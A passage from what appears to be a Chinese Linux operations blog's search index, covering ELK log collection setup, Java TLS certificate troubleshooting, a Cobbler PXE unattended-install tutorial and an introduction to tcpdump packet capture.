=\u003e \"2017-08-18T06:50:14.066Z\", \"message\" =\u003e \"[kjkjljlkjl\\nkl;k;k;hj\\njlkjljl\\nkkkhhh\", \"@version\" =\u003e \"1\", \"tags\" =\u003e [ [0] \"multiline\" ], \"host\" =\u003e \"11\" } #------------演示测试 end ------------------ #------------加入具体搜集----------- [root@11 ~]# vim /etc/logstash/conf.d/file.conf input { file { path =\u003e [\"/var/log/messages\",\"/var/log/secure\"] type =\u003e \"system-log\" start_position =\u003e \"beginning\" } file { path =\u003e \"/var/log/elasticsearch/myes.log\" #这个日志文件小了 好像是不会被收集的？ type =\u003e \"es-log\" start_position =\u003e \"beginning\" codec =\u003e multiline { pattern =\u003e \"^\\[\" negate =\u003e true what =\u003e \"previous\" } } } filter { } output { if [type] == \"system-log\" { elasticsearch { hosts =\u003e [\"172.16.67.11:9200\"] index =\u003e \"system-log-%{+YYYY.MM}\" } } if [type] == \"es-log\" { elasticsearch { hosts =\u003e [\"172.16.67.11:9200\"] index =\u003e \"es-log-%{+YYYY.MM}\" } } } [root@11 conf.d]# /opt/logstash/bin/logstash -f /etc/logstash/conf.d/file.conf Settings: Default pipeline workers: 4 Pipeline main started #-----此处省略万个数据----------- ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:5:3","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"Kibana kibana 是专门为elasticsearch写的一个图形搜索界面 ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:6:0","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"安装方式: ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:7:0","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"下载并安装GPG key、添加yum仓库 [root@11 ~]# rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch [root@11 ~]# vim /etc/yum.repos.d/kibana.repo [kibana-4.5] name=Kibana repository for 4.5.x packages baseurl=http://packages.elastic.co/kibana/4.5/centos gpgcheck=1 gpgkey=http://packages.elastic.co/GPG-KEY-elasticsearch enabled=1 安装及配置 [root@11 ~]# yum install -y kibana #----------过程省略----------- [root@12 ~]# vim /opt/kibana/config/kibana.yml server.port: 5601 #默认端口 server.host: \"0.0.0.0\" #主机地址 elasticsearch.url: \"http://172.16.67.11:9200\" #elasticsearch 地址 kibana.index: \".kibana\" #kibana 的索引 启动kibana [root@12 ~]# /etc/init.d/kibana start kibana started [root@12 ~]# netstat -lntp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:5601 0.0.0.0:* LISTEN 321/node 可视化安装 打开访问：http://172.16.67.12:5601 kibana 不会自动加载elasticsearch的索引，需要自己配置。这儿根据自己已经创建了的索引配置，如上面创建的logstash-%{+YYYY.MM.dd},下面勾选“Use event times to create index names [DEPRECATED]” 然后下面会自动匹配elasticsearch中存在的logstash-YYYY.MM.DD的索引，点击创建就可以了，如果需要显示其他的索引，左侧点击\"add new “新增就可以了。 ","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:7:1","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"Java运维故障记录","date":"2020-07-19","objectID":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","java","解决方案"],"title":"Java运维故障记录","uri":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"1. sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; 接入大神的说明: https://www.jianshu.com/p/a12906b5d0f0 问题： 原有一个跑了很久的java项目在运行的时候报了上述一个错误，协助开发分析后发现是一个https的问题，检查了调用的接口地址，发现该接口地址的证书已经变成了Let's Encrypt的证书,多方查证后发现Let's Encrypt证书太新，使用的java版本太旧而并未加入根证书导致。解决方案是，要么升级java版本，要么导入根证书到jdk信任当中去。 本次记录加入信任方式 : (异常)测试 $ git clone https://github.com/dimalinux/SSLPing.git $ java -jar SSLPing/dist/SSLPing.jar helloworld.letsencrypt.org 443 # 测试结果如下 : # javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target 解决 $ wget https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem $ keytool -trustcacerts -keystore \"$JAVA_HOME/jre/lib/security/cacerts\" -storepass changeit -noprompt -importcert -alias lets-encrypt-x3-cross-signed -file \"lets-encrypt-x3-cross-signed.pem\" # 导入结果: # Certificate was added to keystore (成功)测试 $ java -jar SSLPing.jar visa.vippay.org 443 Successfully connected ","date":"2020-07-19","objectID":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:1:0","tags":["linux","java","解决方案"],"title":"Java运维故障记录","uri":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"2. nginx 反向代理 Springboot 容器应用，浏览器访问时静态资源间接性502 第一种情况: cookie携带的header泰斗，请求头数据过大 # nginx 调整一下参数 proxy_buffer_size 64k; proxy_buffers 32 32k; proxy_busy_buffers_size 128k; 第二种情况: 防火墙问题，重置就好了(有容器的服务器一定不要开防火墙,不然各种问题) ","date":"2020-07-19","objectID":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:2:0","tags":["linux","java","解决方案"],"title":"Java运维故障记录","uri":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"2. cn.hutool.core.io.IORuntimeException: SSLHandshakeException: Received fatal alert: unrecognized_name 问题： 开发的一个java程序，连接测试环境的api正常，但切换到正式的api就报错 分析：可能，正式环境https 仅支持 tls1.2, 我们使用的JDK可能不支持 解决: 升级JDK 8u111 到 JDK 8u322，就可以了(实际环境, 基础容器 java:8u111 切换到openjdk:8u322) ","date":"2020-07-19","objectID":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:3:0","tags":["linux","java","解决方案"],"title":"Java运维故障记录","uri":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","整理收集"],"content":"Cobbler无人值守安装","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":" 文章来源 https://www.linuxprobe.com/cobbler-installation-server.html ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:0:0","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"1. Cobbler 运行流程 Server 端： 第一步：启动 Cobbler 服务 第二步：进行 Cobbler 错误检查，执行 Cobbler check 命令 第三步：进行配置同步，执行 Cobbler sync 命令 第四步：复制相关启动文件文件到 TFTP 目录中 第五步：启动 DHCP 服务，提供地址分配 第六步：DHCP 服务分配 IP 地址 第七步：TFTP 传输启动文件 第八步：Server 端接收安装信息 第九步：Server 端发送 ISO 镜像不 Kickstart 文件 Client 端： 第一步：客户端以 PXE 模式启动 第二步：客户端获取 IP 地址 第三步：通过 TFTP 服务器获取启动文件 第四步：进入 Cobbler 安装选择界面 第五步：客户端确定加载信息 第六步：根据配置信息准备安装系统 第七步：加载 Kickstart 文件 第八步：传输系统安装的其它文件 第九步：进行安装系统 ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:1:0","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2. 搭建 Cobbler 无人值守安装服务器 ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:2:0","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2.1. 安装配置 Cobbler ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:3:0","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2.1.1. 首先安装 epel-release，Cobbler 和 tftp-server 在 base 源中是没有的 $\u003e yum install -y epel-release ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:3:1","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2.1.2. 安装 Cobbler 其实有一部分软件会被当做依赖进行安装上去，比如 tftp 和 httpd 服务，我们这里为了方便可以一并安装，避免后续出现相关问题。 $\u003e yum install -y cobbler cobbler-web dhcp tftp-server pykickstart httpd rsync xinetd 注意: 必须把yum源配好，否则无法全部安装以上软件！ $\u003e vim /etc/yum.repos.d/CentOS-Base.repo #在CentOS-Base.repo配置文件中添加以下源 [aliyun-os] name=aliyun-os baseurl=https://mirrors.aliyun.com/centos/7/os/x86_64/ enabled=1 gpgcheck=0 [aliyun-epel] name=aliyun-epel baseurl=https://mirrors.aliyun.com/epel/7/x86_64/ enabled=1 gpgcheck=0 [aliyun-extra] name=aliyun-extra baseurl=https://mirrors.aliyun.com/centos/7/extras/x86_64/ enabled=1 gpgcheck=0 ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:3:2","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2.1.3. 软件作用说明 cobbler #Cobbler 程序包 cobbler-web #Cobbler 的 Web 服务包 pykickstart #Cobbler 检查 kickstart 语法错误 httpd #Apache Web 服务 ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:3:3","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2.1.4. Cobbler 工作目录介绍 $\u003e ls /etc/cobbler/ auth.conf genders.template named.template secondary.template zone.template cheetah_macros import_rsync_whitelist power settings zone_templates cobbler_bash iso pxe tftpd.template completions ldap reporting users.conf dhcp.template modules.conf rsync.exclude users.digest dnsmasq.template mongodb.conf rsync.template version /etc/cobbler # 配置文件目录 /etc/cobbler/settings # Cobbler 主配置文件，这个文件是 YAML 栺式，Cobbler 是 python 写的程序。 /etc/cobbler/dhcp.template # DHCP服务的配置模板 /etc/cobbler/tftpd.template # tftp 服务的配置模板 /etc/cobbler/rsync.template # rsync 服务的配置模板 /etc/Cobbler/iso # iso 模板配置文件目录 /etc/cobbler/pxe # pxe 模板文件目录 /etc/cobbler/power # 电源的配置文件目录 /etc/cobbler/users.conf # Web 服务授权配置文件 /etc/cobbler/users.digest # 用于 Web 访问的用户名密码配置文件 /etc/cobbler/dnsmasq.template # DNS 服务的配置模板 /etc/cobbler/modules.conf # Cobbler 模块配置文件 /var/lib/cobbler # Cobbler 数据目录 /var/lib/cobbler/config # 配置文件 /var/lib/cobbler/kickstarts # 默认存放 kickstart 文件 /var/lib/cobbler/loaders # 存放的各种引导程序 /var/www/cobbler # 系统安装镜像目录 /var/www/cobbler/ks_mirror # 导入的系统镜像列表 /var/www/cobbler/images # 导入的系统镜像启动文件 /var/www/cobbler/repo_mirror # yum 源存储目录 /var/log/cobbler # 日志目录 /var/log/cobbler/install.log # 客户端系统安装日志 /var/log/cobbler/cobbler.log # Cobbler 日志 ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:3:4","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2.1.5. 首先启动 Cobbler 和 httpd 服务 $\u003e systemctl start cobblerd httpd ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:3:5","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2.1.6. 检查配置 $\u003e cobbler check The following are potential configuration items that you may want to fix: 1 : The 'server' field in /etc/cobbler/settings must be set to something other than localhost, or kickstarting features will not work. This should be a resolvable hostname or IP for the boot server as reachable by all machines that will use it. 2 : For PXE to be functional, the 'next_server' field in /etc/cobbler/settings must be set to something other than 127.0.0.1, and should match the IP of the boot server on the PXE network. 3 : change 'disable' to 'no' in /etc/xinetd.d/tftp 4 : Some network boot-loaders are missing from /var/lib/cobbler/loaders, you may run 'cobbler get-loaders' to download them, or, if you only want to handle x86/x86_64 netbooting, you may ensure that you have installed a *recent* version of the syslinux package installed and can ignore this message entirely. Files in this directory, should you want to support all architectures, should include pxelinux.0, menu.c32, elilo.efi, and yaboot. The 'cobbler get-loaders' command is the easiest way to resolve these requirements. 5 : enable and start rsyncd.service with systemctl 6 : debmirror package is not installed, it will be required to manage debian deployments and repositories 7 : The default password used by the sample templates for newly installed machines (default_password_crypted in /etc/cobbler/settings) is still set to 'cobbler' and should be changed, try: \"openssl passwd -1 -salt 'random-phrase-here' 'your-password-here'\" to generate new one 8 : fencing tools were not found, and are required to use the (optional) power management features. install cman or fence-agents to use them Restart cobblerd and then run 'cobbler sync' to apply changes. 以上问题我们需要逐步解决。 问题 1：修改 server 地址为 192.168.1.7 $\u003e vim /etc/cobbler/settings 改：390 server: 127.0.1 为：390 server: 192.168.1.7 问题 2：修改 next_server 地址为 192.168.1.7 $\u003e vim /etc/cobbler/settings 改：278 next_server: 127.0.1 为：278 next_server: 192.168.1.7 问题 3：修改 tftp 服务被 xinetd 服务管理 $\u003e vim /etc/xinetd.d/tftp 改：14 disable = yes 为：14 disable = no 顺便修改 xinetd 和 tftpd 服务开机启动 $\u003e systemctl start xinetd tftp \u0026\u0026 systemctl enable xinetd tftp 问题 4：下载操作系统引导文件 $\u003e cobbler get-loaders task started: 2020-01-04_031204_get_loaders task started (id=Download Bootloader Content, time=Sat Jan 4 03:12:04 2020) downloading https://cobbler.github.io/loaders/README to /var/lib/cobbler/loaders/README downloading https://cobbler.github.io/loaders/COPYING.elilo to /var/lib/cobbler/loaders/COPYING.elilo downloading https://cobbler.github.io/loaders/COPYING.yaboot to /var/lib/cobbler/loaders/COPYING.yaboot downloading https://cobbler.github.io/loaders/COPYING.syslinux to /var/lib/cobbler/loaders/COPYING.syslinux downloading https://cobbler.github.io/loaders/elilo-3.8-ia64.efi to /var/lib/cobbler/loaders/elilo-ia64.efi downloading https://cobbler.github.io/loaders/yaboot-1.3.17 to /var/lib/cobbler/loaders/yaboot downloading https://cobbler.github.io/loaders/pxelinux.0-3.86 to /var/lib/cobbler/loaders/pxelinux.0 downloading https://cobbler.github.io/loaders/menu.c32-3.86 to /var/lib/cobbler/loaders/menu.c32 downloading https://cobbler.github.io/loaders/grub-0.97-x86.efi to /var/lib/cobbler/loaders/grub-x86.efi downloading https://cobbler.github.io/loaders/grub-0.97-x86_64.efi to /var/lib/cobbler/loaders/grub-x86_64.efi *** TASK COMPLETE *** 问题 5：修改 rsyncd 服务为开机自启动状态并启用它。 $\u003e systemctl start rsyncd \u0026\u0026 systemctl enable rsyncd 问题 6：关于 debian 相关部署管理配置，忽略。 debmirror package is not installed, it will be required to manage debian deployments and repositories # debmirror 包尚未安装，需要它来管理 debian 部署和存储库 问题 7：修改操作系统默认密码 $\u003e openssl passwd -1 -salt 'root' '123456' $1$root$j0bp.KLPyr.u9kgQ428D10 $\u003e vim /etc/cobbler/settings 改：101 default_password_crypted: \"$1$mF86/UHC$WvcIcX2t6crBz2onWxyac.\" 为：101 default_password_crypted: \"$1$root$j0bp.KLPyr.u9kgQ428D10\" 注：root 为用户描述，123456 为密码 问题 8：电源管理相关服务，忽略。 fencing tools were not found, and are required to use the (optional) power ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:3:6","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2.1.7. 修改 Cobbler 管理 dhcp 服务 $\u003e vim /etc/cobbler/settings 改：242 manage_dhcp: 0 为：242 manage_dhcp: 1 ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:3:7","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2.1.8. 同步配置文件，需要先重启 Cobblerd $\u003e systemctl restart cobblerd $\u003e cobbler sync task started: 2020-01-04_032552_sync task started (id=Sync, time=Sat Jan 4 03:25:52 2020) running pre-sync triggers cleaning trees removing: /var/lib/tftpboot/grub/images copying bootloaders trying hardlink /var/lib/cobbler/loaders/pxelinux.0 -\u003e /var/lib/tftpboot/pxelinux.0 trying hardlink /var/lib/cobbler/loaders/menu.c32 -\u003e /var/lib/tftpboot/menu.c32 trying hardlink /var/lib/cobbler/loaders/yaboot -\u003e /var/lib/tftpboot/yaboot trying hardlink /usr/share/syslinux/memdisk -\u003e /var/lib/tftpboot/memdisk trying hardlink /var/lib/cobbler/loaders/grub-x86.efi -\u003e /var/lib/tftpboot/grub/grub-x86.efi trying hardlink /var/lib/cobbler/loaders/grub-x86_64.efi -\u003e /var/lib/tftpboot/grub/grub-x86_64.efi copying distros to tftpboot copying images generating PXE configuration files generating PXE menu structure rendering DHCP files generating /etc/dhcp/dhcpd.conf rendering TFTPD files generating /etc/xinetd.d/tftp cleaning link caches running post-sync triggers running python triggers from /var/lib/cobbler/triggers/sync/post/* running python trigger cobbler.modules.sync_post_restart_services running: dhcpd -t -q received on stdout: received on stderr: running: service dhcpd restart received on stdout: received on stderr: Redirecting to /bin/systemctl restart dhcpd.service running shell triggers from /var/lib/cobbler/triggers/sync/post/* running python triggers from /var/lib/cobbler/triggers/change/* running python trigger cobbler.modules.manage_genders running python trigger cobbler.modules.scm_track running shell triggers from /var/lib/cobbler/triggers/change/* *** TASK COMPLETE *** 注意观察 DHCP 服务是否启动。 重新检查，剩下 2 个可以忽略的问题。 $\u003e cobbler check The following are potential configuration items that you may want to fix: 1 : debmirror package is not installed, it will be required to manage debian deployments and repositories 2 : fencing tools were not found, and are required to use the (optional) power management features. install cman or fence-agents to use them Restart cobblerd and then run 'cobbler sync' to apply changes. ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:3:8","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2.1.9. 挂载光驱 $\u003e mount /dev/sr0 /mnt ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:3:9","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2.1.10. 导入镜像 $\u003e cobbler import --path=/mnt/ --name=CentOS-7.6 --arch=x86_64 task started: 2020-01-04_033346_import task started (id=Media import, time=Sat Jan 4 03:33:46 2020) Found a candidate signature: breed=redhat, version=rhel6 Found a matching signature: breed=redhat, version=rhel6 Adding distros from path /var/www/cobbler/ks_mirror/CentOS-7.6-x86_64: creating new distro: CentOS-7.6-x86_64 trying symlink: /var/www/cobbler/ks_mirror/CentOS-7.6-x86_64 -\u003e /var/www/cobbler/links/CentOS-7.6-x86_64 creating new profile: CentOS-7.6-x86_64 associating repos checking for rsync repo(s) checking for rhn repo(s) checking for yum repo(s) starting descent into /var/www/cobbler/ks_mirror/CentOS-7.6-x86_64 for CentOS-7.6-x86_64 processing repo at : /var/www/cobbler/ks_mirror/CentOS-7.6-x86_64 need to process repo/comps: /var/www/cobbler/ks_mirror/CentOS-7.6-x86_64 looking for /var/www/cobbler/ks_mirror/CentOS-7.6-x86_64/repodata/*comps*.xml Keeping repodata as-is :/var/www/cobbler/ks_mirror/CentOS-7.6-x86_64/repodata *** TASK COMPLETE *** ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:3:10","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2.1.11. 查看镜像，上面是镜像名称，下面是启动菜单。 $\u003e cobbler list distros: CentOS-7.6-x86_64 profiles: CentOS-7.6-x86_64 ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:3:11","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"2.1.12. 同步 Cobbler 配置 $\u003e systemctl restart cobblerd $\u003e cobbler sync 至此，搭建 Cobbler 无人值守安装服务器完成！ ","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/:3:12","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":"介绍在Linux命令行中使用tcpdump","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/","tags":["linux","tcpdump"],"title":"介绍在Linux命令行中使用tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","整理收集"],"content":" 引用 介绍在Linux命令行中使用tcpdump 文章原文来源 opensource.com, 由本站翻译发布用于个人搜集。 https://opensource.com/article/18/10/introduction-tcpdump tcpdump是一个功能强大、功能多样的工具，包括许多选项和过滤器，可以在各种情况下使用。由于它是一个命令行工具，所以最好在没有GUI的远程服务器或设备上运行，以便收集可以稍后分析的数据。它也可以在后台启动，或者使用cron之类的工具作为计划作业启动。 在本文中，我们将介绍一些tcpdump最常见的功能。 ","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/:0:0","tags":["linux","tcpdump"],"title":"介绍在Linux命令行中使用tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","整理收集"],"content":"1. 在Linux上安装 Tcpdump包含在几个Linux发行版中，所以您可能已经安装了它。使用以下命令检查系统是否已安装tcpdump: $\u003e which tcpdump /usr/sbin/tcpdump 如果没有安装tcpdump，可以使用发行版的包管理器安装它。例如，在CentOS或Red Hat Enterprise Linux上，如下所示: $\u003e sudo yum install -y tcpdump Tcpdump需要libpcap，这是一个用于网络包捕获的库。如果没有安装，它将自动作为依赖项添加。 你已经准备好开始捕获一些包了么。 ","date":"2019-09-09","objectID":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/:1:0","tags":["linux","tcpdump"],"title":"介绍在Linux命令行中使用tcpdump","uri":"/posts/linux/%E4%BB%8B%E7%BB%8D%E5%9C%A8linux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%AD%E4%BD%BF%E7%94%A8tcpdump/"},{"categories":["linux","整理收集"],"content":"2. 使用tcpdump捕获数据包 要捕获用于故障排除或分析的包，tcpdump需要提高权限，因此在下面的示例中，大多数命令都以sudo作为前缀。 首先，使用命令tcpdump -D查看哪些接口可用来捕获: $\u003e sudo tcpdump -D 1.eth0 2.virbr0 3.eth1 4.any (Pseudo-device that captures on all interfaces) 5.lo [Loopback] 在上面的示例中，您可以看到我的机器中所有可用的接口。特殊接口any允许在任何活动接口中捕获。 让我们使用它开始捕获一些包。通过运行以下命令捕获任何接口中的所有数据包 : $\u003e sudo tcpdump -i any tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes 09:56:18.293641 IP rhel75.localdomain.ssh \u003e 192.168.64.1.56322: Flags [P.], seq 3770820720:3770820916, ack 3503648727, win 309, options [nop,nop,TS val 76577898 ecr 510770929], length 196 09:56:18.293794 IP 192.168.64.1.56322 \u003e rhel75.localdomain.ssh: Flags [.], ack 196, win 391, options [nop,nop,TS val 510771017 ecr 76577898], length 0 09:56:18.295058 IP rhel75.59883 \u003e gateway.domain: 2486+ PTR? 1.64.168.192.in-addr.arpa. (43) 09:56:18.310225 IP gateway.domain \u003e rhel75.59883: 2486 NXDomain* 0/1/0 (102) 09:56:18.312482 IP rhel75.49685 \u003e gateway.domain: 34242+ PTR? 28.64.168.192.in-addr.arpa. (44) 09:56:18.322425 IP gateway.domain \u003e rhel75.49685: 34242 NXDomain* 0/1/0 (103) 09:56:18.323164 IP rhel75.56631 \u003e gateway.domain: 29904+ PTR? 1.122.168.192.in-addr.arpa. (44) 09:56:18.323342 IP rhel75.localdomain.ssh \u003e 192.168.64.1.56322: Flags [P.], seq 196:584, ack 1, win 309, options [nop,nop,TS val 76577928 ecr 510771017], length 388 09:56:18.323563 IP 192.168.64.1.56322 \u003e rhel75.localdomain.ssh: Flags [.], ack 584, win 411, options [nop,nop,TS val 510771047 ecr 76577928], length 0 